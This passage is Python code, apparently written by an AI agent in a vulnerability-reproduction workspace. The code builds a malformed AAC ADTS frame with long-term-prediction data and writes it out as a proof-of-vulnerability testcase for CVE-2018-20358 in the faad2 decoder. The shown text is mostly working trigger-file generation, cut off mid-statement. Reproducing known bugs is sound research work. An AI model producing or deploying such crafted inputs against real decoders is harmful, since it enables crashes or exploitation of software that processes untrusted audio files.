ness (11 bits) = 0x7FF (VBR)\n    # number_of_raw_data_blocks (2 bits) = 0\n    \n    frame_length = 200  # Placeholder, will adjust\n    \n    byte4 = (frame_length >> 11) & 0xFF\n    byte5 = (frame_length >> 3) & 0xFF\n    byte6 = ((frame_length & 0x07) << 5) | 0x1F  # + first 5 bits of buffer_fullness\n    byte7 = 0xFC  # Rest of buffer_fullness + number_of_raw_data_blocks=0\n    \n    data.append(byte4)\n    data.append(byte5)\n    data.append(byte6)\n    data.append(byte7)\n    \n    # Raw data block starts here\n    bit_pos = 56  # After ADTS header\n    \n    # ID_CPE (3 bits) = 1\n    bit_pos = write_bits(data, bit_pos, 1, 3)\n    \n    # element_instance_tag (4 bits) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 4)\n    \n    # common_window (1 bit) = 1 (enables LTP2 path)\n    bit_pos = write_bits(data, bit_pos, 1, 1)\n    \n    # ics_info for common window\n    # ics_reserved_bit (1 bit) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # window_sequence (2 bits) = 0 (ONLY_LONG_SEQUENCE - required for LTP)\n    bit_pos = write_bits(data, bit_pos, 0, 2)\n    \n    # window_shape (1 bit) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # max_sfb (6 bits for long window) = 10\n    bit_pos = write_bits(data, bit_pos, 10, 6)\n    \n    # predictor_data_present (1 bit) = 1 (enables LTP path in ER mode)\n    bit_pos = write_bits(data, bit_pos, 1, 1)\n    \n    # For LTP object type with common_window, ltp.data_present is checked\n    # ltp.data_present (1 bit) = 1\n    bit_pos = write_bits(data, bit_pos, 1, 1)\n    \n    # ltp_data: lag (11 bits) = 512 (valid range)\n    bit_pos = write_bits(data, bit_pos, 512, 11)\n    \n    # ltp_data: coef (3 bits) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 3)\n    \n    # ltp_data: long_used (max_sfb bits) - all 0s\n    for i in range(10):\n        bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # ms_mask_present (2 bits) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 2)\n    \n    # individual_channel_stream for channel 1\n    # global_gain (8 bits) = 100\n    bit_pos = write_bits(data, bit_pos, 100, 8)\n    \n    # section_data - minimal\n    # sect_cb (4 bits) = 0 (ZERO_HCB)\n    bit_pos = write_bits(data, bit_pos, 0, 4)\n    # sect_len (5 bits for long) = 10\n    bit_pos = write_bits(data, bit_pos, 10, 5)\n    # sect_esc_val - end sections\n    bit_pos = write_bits(data, bit_pos, 0x1F, 5)\n    \n    # scale_factor_data - minimal (no scale factors for ZERO_HCB)\n    \n    # pulse_data_present (1 bit) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # tns_data_present (1 bit) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # gain_control_data_present (1 bit) = 0\n    bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # spectral_data - minimal (all zeros for ZERO_HCB)\n    \n    # individual_channel_stream for channel 2 (similar)\n    bit_pos = write_bits(data, bit_pos, 100, 8)  # global_gain\n    bit_pos = write_bits(data, bit_pos, 0, 4)     # sect_cb\n    bit_pos = write_bits(data, bit_pos, 10, 5)    # sect_len\n    bit_pos = write_bits(data, bit_pos, 0x1F, 5)  # end sections\n    bit_pos = write_bits(data, bit_pos, 0, 1)     # pulse_data_present\n    bit_pos = write_bits(data, bit_pos, 0, 1)     # tns_data_present\n    bit_pos = write_bits(data, bit_pos, 0, 1)     # gain_control_data_present\n    \n    # ID_END (3 bits) = 7\n    bit_pos = write_bits(data, bit_pos, 7, 3)\n    \n    # Byte align\n    while bit_pos % 8 != 0:\n        bit_pos = write_bits(data, bit_pos, 0, 1)\n    \n    # Update frame_length in ADTS header\n    frame_length = len(data)\n    data[3] = (frame_length >> 11) & 0xFF\n    data[4] = (frame_length >> 3) & 0xFF\n    data[5] = ((frame_length & 0x07) << 5) | 0x1F\n    \n    return bytes(data)\n\n# Generate the PoV\npov_data = create_aac_ltp_pov()\n\noutput_path = "/home/ubuntu/PoV/DrillAgent/workspace-sonnet/faad2.cve-2018-20358/triggering/round1/testcase-round1"\n\nwith open(output_path, "wb") as